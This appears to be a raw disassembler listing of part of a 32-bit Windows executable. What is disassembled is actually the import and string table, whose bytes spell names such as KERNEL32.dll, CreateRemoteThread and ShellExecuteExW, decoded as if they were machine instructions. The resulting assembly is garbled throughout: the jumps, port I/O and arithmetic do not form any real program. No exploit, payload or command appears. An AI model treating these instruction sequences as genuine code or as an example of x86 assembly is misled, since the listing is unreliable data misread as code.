  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
